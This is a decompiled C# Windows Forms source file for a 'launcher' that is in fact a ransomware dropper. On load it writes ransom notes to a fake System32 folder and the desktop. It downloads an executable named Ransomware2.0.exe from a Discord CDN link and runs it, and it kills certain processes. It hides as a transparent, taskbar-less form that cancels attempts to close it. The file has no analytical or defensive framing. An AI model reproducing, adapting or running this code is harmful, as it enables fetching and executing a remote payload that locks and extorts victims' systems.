using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace Launcher;

public class launcher2 : Form
{
	private IContainer components;

	public launcher2()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void launcher2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void launcher2_Load(object sender, EventArgs e)
	{
		Directory.CreateDirectory("C:\\Program Files\\System32");
		File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by Pransomware, good luck...");
		((Control)this).set_Left(0);
		((Control)this).set_Top(0);
		((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
		((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\._cache_DCQPKX.exe"))
		{
			using StreamWriter streamWriter = File.CreateText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\._cache_DCQPKX.exe");
			streamWriter.WriteLine("Ur files has been locked :-)");
		}
		using (StreamWriter streamWriter2 = File.CreateText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RANSOMWARE2.0.txt"))
		{
			streamWriter2.WriteLine("Ur files has been locked :-)");
		}
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/756085621973319683/767471312448782356/Ransomware2.0.exe", "C:\\Program Files\\System32\\Ransomware2.0.exe");
		Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");
		Process[] processesByName = Process.GetProcessesByName("DCQPKX");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
		processesByName = Process.GetProcessesByName("._cache_DCQPKX");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("launcher2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).add_FormClosing(new FormClosingEventHandler(launcher2_FormClosing));
		((Form)this).add_Load((EventHandler)launcher2_Load);
		((Control)this).ResumeLayout(false);
	}
}
